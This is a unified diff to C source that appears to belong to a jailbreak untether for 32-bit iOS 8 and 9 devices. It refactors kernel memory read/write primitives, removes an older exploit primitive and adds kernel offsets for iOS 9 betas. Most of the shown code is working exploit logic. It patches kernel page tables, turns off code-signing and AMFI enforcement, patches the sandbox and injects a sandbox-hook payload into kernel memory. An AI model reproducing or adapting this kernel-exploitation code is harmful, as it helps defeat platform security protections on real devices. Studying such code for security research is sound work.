@@ -39,25 +39,9 @@
 #define CHUNK_SIZE 0x800
 
 struct utsname u = { 0 };
-char *lockfile;
-int fd;
-int fildes[2];
-uint32_t pipebuf;
-clock_serv_t clk_battery;
-clock_serv_t clk_realtime;
-uint32_t write_gadget;
 
 uint32_t tte_virt;
 uint32_t tte_phys;
-uint32_t flush_dcache;
-uint32_t invalidate_tlb;
-
-const char *lock_last_path_component = "/tmp/.lock";
-
-kern_return_t io_service_open_extended(mach_port_t service, task_t owningTask, uint32_t connect_type, NDR_record_t ndr, io_buf_ptr_t properties, mach_msg_type_number_t propertiesCnt, kern_return_t *result, mach_port_t *connection);
-kern_return_t io_registry_entry_get_properties(mach_port_t registry_entry, io_buf_ptr_t *properties, mach_msg_type_number_t *propertiesCnt);
-kern_return_t io_service_get_matching_services_bin(mach_port_t master_port, io_struct_inband_t matching, mach_msg_type_number_t matchingCnt, mach_port_t *existing);
-kern_return_t clock_get_attributes(clock_serv_t clock_serv, clock_flavor_t flavor, clock_attr_t clock_attr, mach_msg_type_number_t *clock_attrCnt);
 
 kern_return_t mach_vm_read_overwrite(vm_map_t target_task, mach_vm_address_t address, mach_vm_size_t size, mach_vm_address_t data, mach_vm_size_t *outsize);
 kern_return_t mach_vm_write(vm_map_t target_task, mach_vm_address_t address, vm_offset_t data, mach_msg_type_number_t dataCnt);
@@ -92,136 +76,58 @@ void copyout(uint32_t to, void* from, size_t size) {
     mach_vm_write(tfp0, to, (vm_offset_t)from, (mach_msg_type_number_t)size);
 }
 
-uint32_t read_primitive_byte_tfp0(uint32_t addr) {
+uint32_t rk8(uint32_t addr) {
     uint8_t val = 0;
     copyin(&val, addr, 1);
     return val;
 }
 
-uint32_t write_primitive_byte_tfp0(uint32_t addr, uint8_t val) {
+uint32_t wk8(uint32_t addr, uint8_t val) {
     copyout(addr, &val, 1);
     return val;
 }
 
-uint32_t read_primitive_word_tfp0(uint32_t addr) {
+uint32_t rk16(uint32_t addr) {
     uint16_t val = 0;
     copyin(&val, addr, 2);
     return val;
 }
 
-uint32_t write_primitive_word_tfp0(uint32_t addr, uint16_t val) {
+uint32_t wk16(uint32_t addr, uint16_t val) {
     copyout(addr, &val, 2);
     return val;
 }
 
-uint32_t read_primitive_dword_tfp0(uint32_t addr) {
+uint32_t rk32(uint32_t addr) {
     uint32_t val = 0;
     copyin(&val, addr, 4);
     return val;
 }
 
-uint32_t write_primitive_dword_tfp0(uint32_t addr, uint32_t val) {
+uint32_t wk32(uint32_t addr, uint32_t val) {
     copyout(addr, &val, 4);
     return val;
 }
 
-void init(void){
-    
-#ifdef UNTETHER
-    int fd;
-    fd = open(CONSOLE,NEWFILE,0644);
-    if(fd<0){
-        perror(CONSOLE);
-    }
-    close(1);
-    close(2);
-    if(dup2(fd, 1) < 0){
-        perror("dup");
-    }
-    if(dup2(fd, 2) < 0){
-        perror("dup");
-    }
-    close(fd);
-    
-    printf("\n");
-#endif
-    
-}
-
-void initialize(void) {
-    kern_return_t kr;
-    
-    lockfile = malloc(strlen(lock_last_path_component) + 1);
-    assert(lockfile);
-    
-    strcpy(lockfile, lock_last_path_component);
-    
-    fd = open(lockfile, O_CREAT | O_WRONLY, 0644);
-    assert(fd != -1);
-    
-    flock(fd, LOCK_EX);
-    
-    assert(pipe(fildes) != -1);
-    
-    kr = host_get_clock_service(mach_host_self(), CALENDAR_CLOCK, &clk_battery);
-    if (kr != KERN_SUCCESS) {
-        printf("[-] err: %d\n", err_get_code(kr));
-    }
-    
-    kr = host_get_clock_service(mach_host_self(), REALTIME_CLOCK, &clk_realtime);
-    if (kr != KERN_SUCCESS) {
-        printf("[-] err: %d\n", err_get_code(kr));
-    }
-}
-
-void exec_primitive(uint32_t fct, uint32_t arg1, uint32_t arg2) {
-    int attr;
-    unsigned int attrCnt;
-    char data[64];
-    
-    write(fildes[1], "AAAABBBB", 8);
-    write(fildes[1], &arg1, 4);
-    write(fildes[1], &arg2, 4);
-    write(fildes[1], &fct, 4);
-    clock_get_attributes(clk_realtime, pipebuf, &attr, &attrCnt);
-    
-    read(fildes[0], data, 64);
-}
-
-uint32_t read_primitive(uint32_t addr) {
-    int attr;
-    unsigned int attrCnt;
-    
-    return clock_get_attributes(clk_battery, addr, &attr, &attrCnt);
-}
-
-void write_primitive(uint32_t addr, uint32_t value) {
-    addr -= 0xc;
-    exec_primitive(write_gadget, addr, value);
-}
-
-void patch_page_table(int hasTFP0, uint32_t tte_virt, uint32_t tte_phys, uint32_t flush_dcache, uint32_t invalidate_tlb, uint32_t page) {
+void patch_page_table(uint32_t tte_virt, uint32_t tte_phys, uint32_t page) {
     uint32_t i = page >> 20;
     uint32_t j = (page >> 12) & 0xFF;
     uint32_t addr = tte_virt+(i<<2);
-    uint32_t entry = hasTFP0 == 0 ? read_primitive_dword_tfp0(addr) : read_primitive(addr);
+    uint32_t entry = rk32(addr);
     if ((entry & L1_PAGE_PROTO) == L1_PAGE_PROTO) {
         uint32_t page_entry = ((entry & L1_COARSE_PT) - tte_phys) + tte_virt;
         uint32_t addr2 = page_entry+(j<<2);
-        uint32_t entry2 = hasTFP0 == 0 ? read_primitive_dword_tfp0(addr2) : read_primitive(addr2);
+        uint32_t entry2 = rk32(addr2);
         if (entry2) {
             uint32_t new_entry2 = (entry2 & (~L2_PAGE_APX));
-            hasTFP0 == 0 ? write_primitive_dword_tfp0(addr2, new_entry2) : write_primitive(addr2, new_entry2);
+            wk32(addr2, new_entry2);
         }
     } else if ((entry & L1_SECT_PROTO) == L1_SECT_PROTO) {
         uint32_t new_entry = L1_PROTO_TTE(entry);
         new_entry &= ~L1_SECT_APX;
-        hasTFP0 == 0 ? write_primitive_dword_tfp0(addr, new_entry) : write_primitive(addr, new_entry);
+        wk32(addr, new_entry);
     }
-    
-    exec_primitive(flush_dcache, 0, 0);
-    exec_primitive(invalidate_tlb, 0, 0);
-    
+    usleep(10000);
 }
 
 void dump_kernel(vm_address_t kernel_base, uint8_t *dest, size_t ksize) {
@@ -237,7 +143,7 @@ void dump_kernel(vm_address_t kernel_base, uint8_t *dest, size_t ksize) {
 
 void patch_bootargs(uint32_t addr){
     //printf("set bootargs\n");
-    uint32_t bootargs_addr = read_primitive_dword_tfp0(addr) + 0x38;
+    uint32_t bootargs_addr = rk32(addr) + 0x38;
     const char* new_bootargs = "cs_enforcement_disable=1 amfi_get_out_of_my_way=1";
     
     // evasi0n6
@@ -334,6 +240,18 @@ uint32_t find_kernel_pmap(uintptr_t kernel_base) {
         if (strstr(u.version, "3248")) { //9.0-9.0.2
             printf("9.0-9.0.2\n");
             pmap_addr = 0x3f7444;
+        } else if (strstr(u.version, "3247.1.56")) { //9.0b4
+            printf("9.0b4\n");
+            pmap_addr = 0x3f5448;
+        } else if (strstr(u.version, "3247.1.36")) { //9.0b3
+            printf("9.0b3\n");
+            pmap_addr = 0x3f6448;
+        } else if (strstr(u.version, "3247.1.6")) { //9.0b2
+            printf("9.0b2\n");
+            pmap_addr = 0x3fb45c;
+        } else if (strstr(u.version, "3216")) { //9.0b1
+            printf("9.0b1\n");
+            pmap_addr = 0x3f8454;
         } else if (strstr(u.version, "2784")) { //8.3-8.4.1
             printf("8.3-8.4.1\n");
             pmap_addr = 0x3a211c;
@@ -353,6 +271,18 @@ uint32_t find_kernel_pmap(uintptr_t kernel_base) {
         if (strstr(u.version, "3248")) { //9.0-9.0.2
             printf("9.0-9.0.2\n");
             pmap_addr = 0x3fd444;
+        } else if (strstr(u.version, "3247.1.56")) { //9.0b4
+            printf("9.0b4\n");
+            pmap_addr = 0x3fc448;
+        } else if (strstr(u.version, "3247.1.36")) { //9.0b3
+            printf("9.0b3\n");
+            pmap_addr = 0x3fe448;
+        } else if (strstr(u.version, "3247.1.6")) { //9.0b2
+            printf("9.0b2\n");
+            pmap_addr = 0x40345c;
+        } else if (strstr(u.version, "3216")) { //9.0b1
+            printf("9.0b1\n");
+            pmap_addr = 0x3ff454;
         } else if (strstr(u.version, "2784")) { //8.3-8.4.1
             printf("8.3-8.4.1\n");
             pmap_addr = 0x3a711c;
@@ -378,7 +308,6 @@ void unjail8(uint32_t kbase){
     
     /* patchfinder */
     printf("[*] running patchfinder\n");
-    //uint32_t tfp0_patch = kbase + find_tfp0_patch(kbase, kdata, ksize);
     uint32_t proc_enforce = kbase + find_proc_enforce(kbase, kdata, ksize);
     uint32_t cs_enforcement_disable_amfi = kbase + find_cs_enforcement_disable_amfi(kbase, kdata, ksize);
     uint32_t PE_i_can_has_debugger_1 = kbase + find_i_can_has_debugger_1(kbase, kdata, ksize);
@@ -395,8 +324,6 @@ void unjail8(uint32_t kbase){
     uint32_t vn_getpath = find_vn_getpath(kbase, kdata, ksize);
     uint32_t csops_addr = kbase + find_csops(kbase, kdata, ksize);
     uint32_t csops2_addr = kbase + find_csops2(kbase, kdata, ksize);
-    flush_dcache = kbase + find_flush_dcache(kbase, kdata, ksize);
-    invalidate_tlb = kbase + find_invalidate_tlb(kbase, kdata, ksize);
     //uint32_t kernel_pmap = kbase + find_pmap_location(kbase, kdata, ksize);
     uint32_t kernel_pmap = find_kernel_pmap(kbase);
     
@@ -416,14 +343,12 @@ void unjail8(uint32_t kbase){
     printf("[PF] vn_getpath:                 %08x\n", vn_getpath);
     printf("[PF] csops:                      %08x\n", csops_addr);
     printf("[PF] csops2:                     %08x\n", csops2_addr);
-    printf("[PF] flush_dcache:               %08x\n", flush_dcache);
-    printf("[PF] invalidate_tlb:             %08x\n", invalidate_tlb);
     printf("[PF] kernel_pmap:                %08x\n", kernel_pmap);
 
     printf("[*] get kernel_pmap_store, tte_virt, tte_phys\n");
-    uint32_t kernel_pmap_store = read_primitive_dword_tfp0(kernel_pmap);
-    tte_virt = read_primitive_dword_tfp0(kernel_pmap_store);
-    tte_phys = read_primitive_dword_tfp0(kernel_pmap_store+4);
+    uint32_t kernel_pmap_store = rk32(kernel_pmap);
+    tte_virt = rk32(kernel_pmap_store);
+    tte_phys = rk32(kernel_pmap_store+4);
     printf("[*] kernel pmap store @ 0x%08x\n", kernel_pmap_store);
     printf("[*] kernel pmap tte is at VA 0x%08x PA 0x%08x\n", tte_virt, tte_phys);
 
@@ -431,17 +356,17 @@ void unjail8(uint32_t kbase){
 
     /* proc_enforce: -> 0 */
     printf("[*] proc_enforce\n");
-    write_primitive_dword_tfp0(proc_enforce, 0);
+    wk32(proc_enforce, 0);
     
     /* cs_enforcement_disable = 1 && amfi_get_out_of_my_way = 1 */
     printf("[*] cs_enforcement_disable_amfi\n");
-    write_primitive_byte_tfp0(cs_enforcement_disable_amfi, 1);
-    write_primitive_byte_tfp0(cs_enforcement_disable_amfi-4, 1);
+    wk8(cs_enforcement_disable_amfi, 1);
+    wk8(cs_enforcement_disable_amfi-4, 1);
     
     /* debug_enabled -> 1 */
     printf("[*] debug_enabled\n");
-    write_primitive_dword_tfp0(PE_i_can_has_debugger_1, 1);
-    write_primitive_dword_tfp0(PE_i_can_has_debugger_2, 1);
+    wk32(PE_i_can_has_debugger_1, 1);
+    wk32(PE_i_can_has_debugger_2, 1);
     
     /* bootArgs */
     printf("[*] bootargs\n");
@@ -449,42 +374,42 @@ void unjail8(uint32_t kbase){
     
     /* vm_fault_enter
     printf("[*] vm_fault_enter\n");
-    patch_page_table(0, tte_virt, tte_phys, flush_dcache, invalidate_tlb, (vm_fault_enter & ~0xFFF));
-    write_primitive_dword_tfp0(vm_fault_enter, 0x2201bf00);
+    patch_page_table(tte_virt, tte_phys, (vm_fault_enter & ~0xFFF));
+    wk32(vm_fault_enter, 0x2201bf00);
     */
 
     /* vm_map_enter */
     printf("[*] vm_map_enter\n");
-    patch_page_table(0, tte_virt, tte_phys, flush_dcache, invalidate_tlb, (vm_map_enter & ~0xFFF));
-    write_primitive_dword_tfp0(vm_map_enter, 0x4280bf00);
+    patch_page_table(tte_virt, tte_phys, (vm_map_enter & ~0xFFF));
+    wk32(vm_map_enter, 0x4280bf00);
     
     /* vm_map_protect: set NOP */
     printf("[*] vm_map_protect\n");
-    patch_page_table(0, tte_virt, tte_phys, flush_dcache, invalidate_tlb, (vm_map_protect & ~0xFFF));
-    write_primitive_dword_tfp0(vm_map_protect, 0xbf00bf00);
+    patch_page_table(tte_virt, tte_phys, (vm_map_protect & ~0xFFF));
+    wk32(vm_map_protect, 0xbf00bf00);
     
     /* mount patch */
     printf("[*] mount patch\n");
-    patch_page_table(0, tte_virt, tte_phys, flush_dcache, invalidate_tlb, (mount_patch & ~0xFFF));
-    write_primitive_byte_tfp0(mount_patch, 0xe0);
+    patch_page_table(tte_virt, tte_phys, (mount_patch & ~0xFFF));
+    wk8(mount_patch, 0xe0);
     
     /* mapForIO: prevent kIOReturnLockedWrite error */
     printf("[*] mapForIO\n");
-    patch_page_table(0, tte_virt, tte_phys, flush_dcache, invalidate_tlb, (mapForIO & ~0xFFF));
-    write_primitive_dword_tfp0(mapForIO, 0xbf00bf00);
+    patch_page_table(tte_virt, tte_phys, (mapForIO & ~0xFFF));
+    wk32(mapForIO, 0xbf00bf00);
     
     /* csops */
     printf("[*] csops\n");
-    patch_page_table(0, tte_virt, tte_phys, flush_dcache, invalidate_tlb, (csops_addr & ~0xFFF));
-    write_primitive_dword_tfp0(csops_addr, 0xbf00bf00);
+    patch_page_table(tte_virt, tte_phys, (csops_addr & ~0xFFF));
+    wk32(csops_addr, 0xbf00bf00);
     
-    patch_page_table(0, tte_virt, tte_phys, flush_dcache, invalidate_tlb, (csops2_addr & ~0xFFF));
-    write_primitive_byte_tfp0(csops2_addr, 0x20);
+    patch_page_table(tte_virt, tte_phys, (csops2_addr & ~0xFFF));
+    wk8(csops2_addr, 0x20);
     
     /* sandbox */
     printf("[*] sandbox\n");
-    patch_page_table(0, tte_virt, tte_phys, flush_dcache, invalidate_tlb, (sandbox_call_i_can_has_debugger & ~0xFFF));
-    write_primitive_dword_tfp0(sandbox_call_i_can_has_debugger, 0xbf00bf00);
+    patch_page_table(tte_virt, tte_phys, (sandbox_call_i_can_has_debugger & ~0xFFF));
+    wk32(sandbox_call_i_can_has_debugger, 0xbf00bf00);
     
     /* sb_evaluate */
     unsigned char taig32_payload[] = {
@@ -521,7 +446,7 @@ void unjail8(uint32_t kbase){
     uint32_t memcmp_bl_2 = make_bl(payload_base+0x44, memcmp_addr);
     uint32_t memcmp_bl_3 = make_bl(payload_base+0x54, memcmp_addr);
     uint32_t memcmp_bl_4 = make_bl(payload_base+0x64, memcmp_addr);
-    uint32_t sb_evaluate_val = read_primitive_dword_tfp0(sb_patch);
+    uint32_t sb_evaluate_val = rk32(sb_patch);
     uint32_t back_sb_evaluate = make_b_w(payload_base+0x8c, (sb_patch+4-kbase));
     
     *(uint32_t*)(taig32_payload+0x22) = vn_getpath_bl;
@@ -537,22 +462,19 @@ void unjail8(uint32_t kbase){
     
     // hook sb_evaluate
     printf("[*] sb_evaluate\n");
-    patch_page_table(0, tte_virt, tte_phys, flush_dcache, invalidate_tlb, ((kbase + payload_base) & ~0xFFF));
+    patch_page_table(tte_virt, tte_phys, ((kbase + payload_base) & ~0xFFF));
     copyout((kbase + payload_base), sandbox_payload, payload_len);
     
     printf("[*] sb_evaluate_hook\n");
     uint32_t sb_evaluate_hook = make_b_w((sb_patch-kbase), payload_base);
-    patch_page_table(0, tte_virt, tte_phys, flush_dcache, invalidate_tlb, (sb_patch & ~0xFFF));
-    write_primitive_dword_tfp0(sb_patch, sb_evaluate_hook);
+    patch_page_table(tte_virt, tte_phys, (sb_patch & ~0xFFF));
+    wk32(sb_patch, sb_evaluate_hook);
 
     printf("[*] patch tfp0\n");
     uint32_t tfp0_patch = kbase + find_tfp0_patch(kbase, kdata, ksize);
     printf("[PF] tfp0_patch: %08x\n", tfp0_patch);
-    patch_page_table(0, tte_virt, tte_phys, flush_dcache, invalidate_tlb, (tfp0_patch & ~0xFFF));
-    write_primitive_dword_tfp0(tfp0_patch, 0xbf00bf00);
-
-    printf("[*] flush dcache\n");
-    exec_primitive(flush_dcache, 0, 0);
+    patch_page_table(tte_virt, tte_phys, (tfp0_patch & ~0xFFF));
+    wk32(tfp0_patch, 0xbf00bf00);
     
     printf("enable patched.\n");
     
@@ -584,6 +506,7 @@ void unjail9(uint32_t kbase){
     uint32_t vn_getpath = find_vn_getpath(kbase, kdata, ksize);
     uint32_t csops_addr = kbase + find_csops(kbase, kdata, ksize);
     uint32_t amfi_file_check_mmap = kbase + find_amfi_file_check_mmap(kbase, kdata, ksize);
+    uint32_t kernel_pmap = find_kernel_pmap(kbase);
 
     printf("[PF] proc_enforce:               %08x\n", proc_enforce);
     printf("[PF] cs_enforcement_disable:     %08x\n", cs_enforcement_disable_amfi);
@@ -601,56 +524,76 @@ void unjail9(uint32_t kbase){
     printf("[PF] vn_getpath:                 %08x\n", vn_getpath);
     printf("[PF] csops:                      %08x\n", csops_addr);
     printf("[PF] amfi_file_check_mmap:       %08x\n", amfi_file_check_mmap);
+    printf("[PF] kernel_pmap:                %08x\n", kernel_pmap);
+
+    printf("[*] get kernel_pmap_store, tte_virt, tte_phys\n");
+    uint32_t kernel_pmap_store = rk32(kernel_pmap);
+    tte_virt = rk32(kernel_pmap_store);
+    tte_phys = rk32(kernel_pmap_store+4);
+    printf("[*] kernel pmap store @ 0x%08x\n", kernel_pmap_store);
+    printf("[*] kernel pmap tte is at VA 0x%08x PA 0x%08x\n", tte_virt, tte_phys);
     
     printf("[*] running kernelpatcher\n");
     
     /* proc_enforce: -> 0 */
-    write_primitive_dword_tfp0(proc_enforce, 0);
+    printf("[*] proc_enforce\n");
+    wk32(proc_enforce, 0);
     
     /* cs_enforcement_disable = 1 && amfi_get_out_of_my_way = 1 */
-    write_primitive_byte_tfp0(cs_enforcement_disable_amfi, 1);
-    write_primitive_byte_tfp0(cs_enforcement_disable_amfi-1, 1);
+    printf("[*] cs_enforcement_disable_amfi\n");
+    wk8(cs_enforcement_disable_amfi, 1);
+    wk8(cs_enforcement_disable_amfi-1, 1);
     
     /* bootArgs */
+    printf("[*] bootargs\n");
     patch_bootargs(p_bootargs);
     
     /* debug_enabled -> 1 */
-    patch_page_table(0, tte_virt, tte_phys, flush_dcache, invalidate_tlb, (PE_i_can_has_debugger_1 & ~0xFFF));
-    write_primitive_dword_tfp0(PE_i_can_has_debugger_1, 1);
-    patch_page_table(0, tte_virt, tte_phys, flush_dcache, invalidate_tlb, (PE_i_can_has_debugger_2 & ~0xFFF));
-    write_primitive_dword_tfp0(PE_i_can_has_debugger_2, 1);
+    printf("[*] debug_enabled\n");
+    patch_page_table(tte_virt, tte_phys, (PE_i_can_has_debugger_1 & ~0xFFF));
+    wk32(PE_i_can_has_debugger_1, 1);
+    patch_page_table(tte_virt, tte_phys, (PE_i_can_has_debugger_2 & ~0xFFF));
+    wk32(PE_i_can_has_debugger_2, 1);
     
     /* vm_fault_enter */
-    patch_page_table(0, tte_virt, tte_phys, flush_dcache, invalidate_tlb, (vm_fault_enter & ~0xFFF));
-    write_primitive_word_tfp0(vm_fault_enter, 0x2201);
+    printf("[*] vm_fault_enter\n");
+    patch_page_table(tte_virt, tte_phys, (vm_fault_enter & ~0xFFF));
+    wk16(vm_fault_enter, 0x2201);
     
     /* vm_map_enter */
-    patch_page_table(0, tte_virt, tte_phys, flush_dcache, invalidate_tlb, (vm_map_enter & ~0xFFF));
-    write_primitive_dword_tfp0(vm_map_enter, 0xbf00bf00);
+    printf("[*] vm_map_enter\n");
+    patch_page_table(tte_virt, tte_phys, (vm_map_enter & ~0xFFF));
+    wk32(vm_map_enter, 0xbf00bf00);
     
     /* vm_map_protect: set NOP */
-    patch_page_table(0, tte_virt, tte_phys, flush_dcache, invalidate_tlb, (vm_map_protect & ~0xFFF));
-    write_primitive_dword_tfp0(vm_map_protect, 0xbf00bf00);
+    printf("[*] vm_map_protect\n");
+    patch_page_table(tte_virt, tte_phys, (vm_map_protect & ~0xFFF));
+    wk32(vm_map_protect, 0xbf00bf00);
     
     /* mount patch */
-    patch_page_table(0, tte_virt, tte_phys, flush_dcache, invalidate_tlb, (mount_patch & ~0xFFF));
-    write_primitive_byte_tfp0(mount_patch, 0xe7);
+    printf("[*] mount patch\n");
+    patch_page_table(tte_virt, tte_phys, (mount_patch & ~0xFFF));
+    wk8(mount_patch, 0xe7);
     
     /* mapForIO: prevent kIOReturnLockedWrite error */
-    patch_page_table(0, tte_virt, tte_phys, flush_dcache, invalidate_tlb, (mapForIO & ~0xFFF));
-    write_primitive_dword_tfp0(mapForIO, 0xbf00bf00);
+    printf("[*] mapForIO\n");
+    patch_page_table(tte_virt, tte_phys, (mapForIO & ~0xFFF));
+    wk32(mapForIO, 0xbf00bf00);
     
     /* csops */
-    patch_page_table(0, tte_virt, tte_phys, flush_dcache, invalidate_tlb, (csops_addr & ~0xFFF));
-    write_primitive_dword_tfp0(csops_addr, 0xbf00bf00);
+    printf("[*] csops\n");
+    patch_page_table(tte_virt, tte_phys, (csops_addr & ~0xFFF));
+    wk32(csops_addr, 0xbf00bf00);
     
     /* amfi_file_check_mmap */
-    patch_page_table(0, tte_virt, tte_phys, flush_dcache, invalidate_tlb, (amfi_file_check_mmap & ~0xFFF));
-    write_primitive_dword_tfp0(amfi_file_check_mmap, 0xbf00bf00);
+    printf("[*] amfi_file_check_mmap\n");
+    patch_page_table(tte_virt, tte_phys, (amfi_file_check_mmap & ~0xFFF));
+    wk32(amfi_file_check_mmap, 0xbf00bf00);
     
     /* sandbox */
-    patch_page_table(0, tte_virt, tte_phys, flush_dcache, invalidate_tlb, (sandbox_call_i_can_has_debugger & ~0xFFF));
-    write_primitive_dword_tfp0(sandbox_call_i_can_has_debugger, 0xbf00bf00);
+    printf("[*] sandbox\n");
+    patch_page_table(tte_virt, tte_phys, (sandbox_call_i_can_has_debugger & ~0xFFF));
+    wk32(sandbox_call_i_can_has_debugger, 0xbf00bf00);
     
     /* sb_evaluate */
     unsigned char pangu9_payload[] = {
@@ -687,7 +630,7 @@ void unjail9(uint32_t kbase){
     uint32_t memcmp_bl_2 = make_bl(payload_base+0x42, memcmp_addr);
     uint32_t memcmp_bl_3 = make_bl(payload_base+0x50, memcmp_addr);
     uint32_t memcmp_bl_4 = make_bl(payload_base+0x5e, memcmp_addr);
-    uint32_t sb_evaluate_val = read_primitive_dword_tfp0(sb_patch);
+    uint32_t sb_evaluate_val = rk32(sb_patch);
     uint32_t back_sb_evaluate = make_b_w(payload_base+0x86, (sb_patch+4-kbase));
     
     *(uint32_t*)(pangu9_payload+0x20) = vn_getpath_bl;
@@ -702,15 +645,21 @@ void unjail9(uint32_t kbase){
     memcpy(sandbox_payload, pangu9_payload, payload_len);
     
     // hook sb_evaluate
-    patch_page_table(0, tte_virt, tte_phys, flush_dcache, invalidate_tlb, ((kbase + payload_base) & ~0xFFF));
+    printf("[*] sb_evaluate\n");
+    patch_page_table(tte_virt, tte_phys, ((kbase + payload_base) & ~0xFFF));
     copyout((kbase + payload_base), sandbox_payload, payload_len);
     
+    printf("[*] sb_evaluate_hook\n");
     uint32_t sb_evaluate_hook = make_b_w((sb_patch-kbase), payload_base);
-    patch_page_table(0, tte_virt, tte_phys, flush_dcache, invalidate_tlb, (sb_patch & ~0xFFF));
-    write_primitive_dword_tfp0(sb_patch, sb_evaluate_hook);
+    patch_page_table(tte_virt, tte_phys, (sb_patch & ~0xFFF));
+    wk32(sb_patch, sb_evaluate_hook);
 
-    exec_primitive(flush_dcache, 0, 0);
-    
+    printf("[*] patch tfp0\n");
+    uint32_t tfp0_patch = kbase + find_tfp0_patch(kbase, kdata, ksize);
+    printf("[PF] tfp0_patch: %08x\n", tfp0_patch);
+    patch_page_table(tte_virt, tte_phys, (tfp0_patch & ~0xFFF));
+    wk32(tfp0_patch, 0xbf00bf00);
+
     printf("enable patched.\n");
     
 }
@@ -744,26 +693,13 @@ void load_jb(void){
         chown("/.installed_daibutsu", 0, 0);
     }
     
-    
-    // afc2
-    //char *afc2d_path = "/usr/share/daibutsuAFC2/afc2d.dmg";
-    //char *afc2d_exec_path = "/usr/share/daibutsuAFC2/afcd2";
-    //FILE *fd = fopen(afc2d_path, "r");
-    //if (fd) {
-    //    fd = fopen(afc2d_exec_path, "r");
-    //    if (fd) {
-    //        posix_spawn(&pd, afc2d_exec_path, NULL, NULL, (char **)&(const char*[]){ afc2d_exec_path, NULL }, NULL);
-    //        waitpid(pd, NULL, 0);
-    //    }
-    //}
-    
     printf("[*] loading JB\n");
     // substrate: run "dirhelper"
     jl = "/bin/bash";
     posix_spawn(&pd, jl, NULL, NULL, (char **)&(const char*[]){ jl, "/usr/libexec/dirhelper", NULL }, NULL);
     waitpid(pd, NULL, 0);
     
-    usleep(100000);
+    usleep(10000);
     
     // looks like this doesnt work with jsc untether, will use daemonloader instead, launched by dirhelper above
     jl = "/bin/launchctl";
@@ -774,7 +710,6 @@ void load_jb(void){
 }
 
 void failed(void){
-    
     printf("[-] failed to execute untether. rebooting.\n");
     reboot(0);
 }
@@ -792,9 +727,6 @@ int main(void){
         printf("isA5? yes\n");
         isA5=1;
     }
-    
-    init();
-    initialize();
 
     uint32_t kernel_base;
     tfp0 = exploit(&kernel_base);
